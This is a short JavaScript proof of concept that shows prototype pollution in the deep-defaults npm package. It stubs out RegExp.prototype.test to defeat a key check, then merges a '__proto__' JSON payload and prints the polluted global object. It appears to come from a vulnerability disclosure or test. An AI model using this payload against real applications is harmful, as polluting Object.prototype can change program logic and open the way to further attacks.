RegExp.prototype.test = () => false;
var deepDefaults = require('deep-defaults');
var malicious_payload = '{"__proto__":{"polluted":"yes"}}';
var obj = {};
console.log({}.polluted);
deepDefaults(obj, JSON.parse(malicious_payload));
console.log({}.polluted);